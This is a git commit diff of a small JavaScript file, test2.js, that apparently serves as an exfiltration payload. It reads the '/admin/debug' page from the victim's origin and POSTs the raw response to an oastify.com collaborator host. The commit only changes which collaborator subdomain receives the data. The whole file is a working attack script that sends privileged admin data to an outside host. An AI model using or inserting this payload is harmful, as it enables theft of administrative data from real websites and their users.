af142bd2bcf56aa429b22297c71391306def5ec7
D3V1LKKW <40319904+D3V1LKKW@users.noreply.github.com>
2026-02-22 20:16:36 +0700

    Update test2.js

--- test2.js
+++ test2.js
@@ -1,7 +1,7 @@
 fetch('/admin/debug')
   .then(r => r.text())
   .then(d => {
-    fetch('https://xuv7rvwvy6rlnrkq7p3e1tkjpav1jvdj2.oastify.com/', {
+    fetch('https://nwnxtlyl0wtbphmg9f543jm9r0xrllq9f.oastify.com/', {
       method: 'POST',
       mode: 'no-cors',
       body: d // Raw data, no encoding needed
